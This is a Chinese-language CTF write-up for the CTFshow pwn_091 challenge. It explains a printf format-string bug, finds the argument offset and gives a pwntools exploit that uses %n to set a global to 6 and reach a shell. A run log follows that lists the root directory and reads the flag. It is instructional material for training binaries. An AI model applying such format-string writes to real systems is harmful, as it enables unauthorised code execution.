# CTFshow-pwn_091
1. 题目来源：CTFshow题库（本地环境）
2. PWN + 格式化字符串（覆写指定较小值）
## 解题思路
> %n 的使用

仅没有 PIE 保护，部分 RELRO  
```text
mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ checksec ./pwn_091
[*] '/home/mrw/CTFshow/pwn_091'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```
 
漏洞函数和主函数伪代码如下  
```c
unsigned int ctfshow()
{
  char s[80]; // [esp+Ch] [ebp-5Ch] BYREF
  unsigned int v2; // [esp+5Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  memset(s, 0, sizeof(s));
  read(0, s, 0x50u);
  printf(s);
  printf("daniu now is :%d!\n", daniu);
  return __readgsdword(0x14u) ^ v2;
}
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init(&argc);
  logo();
  ctfshow();
  if ( daniu == 6 ) // bss 段 0x0804B038
  {
    puts("daniu praise you for a good job!");
    system("/bin/sh");
  }
  return 0;
}
```
- printf 的 format 字符串中若出现多余的格式符将会自动把栈上的数据作为格式符参数  
- 在格式化字符串中存在一个特殊的格式符%n，会向其所对应的参数返回已成功输出的字符数  
- 对于 printf(buf) 类可以设计一个合适的格式化字符串使得函数向指定地址进行任意写  
- 向程序发送b'AAAA' + b'%p\n' * 20，发现输出的第7个指针变成了0x41414141，说明第7个参数对应的为输入的字符串起始位置  
- 据此可构建 payload 为 b'%6c%9$n ' + p32(0x0804B038)，其中空格为保护参数对齐所用的垫字  
**exp 如下**  
```python
from pwn import *
p = process('./pwn_091')
payload = b'%6c%9$n ' + p32(0x0804B038)
p.send(payload)
p.interactive()
```

## Flag
> 题目在本地运行， flag自己随便设的
运行结果如下
```text
mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ vim ./exp/pwn_091.py
mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ python3 ./exp/pwn_091.py
[+] Starting local process './pwn_091': pid 24690
[*] Switching to interactive mode
    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           
  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           
 ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██
 ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀
 ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ 
  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ 
    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  
    * *************************************                           
    * Classify: CTFshow --- PWN --- 入门                              
    * Type  : Format_String                                           
    * Site  : https://ctf.show/                                       
    * Hint  : Very Ez !                                               
    * *************************************                           
     \xbc 8\xb0\x0daniu now is :6!
daniu praise you for a good job!
$ ls /
bin           dev     lib32            media  run               swap.img
bin.usr-is-merged  etc     lib64            mnt    sbin               sys
boot           flag  lib.usr-is-merged  opt    sbin.usr-is-merged  tmp
cdrom           home  libx32            proc   snap               usr
ctfshow_flag       lib     lost+found        root   srv               var
$ cat /ctfshow_flag
flag{Success!}
$  
```
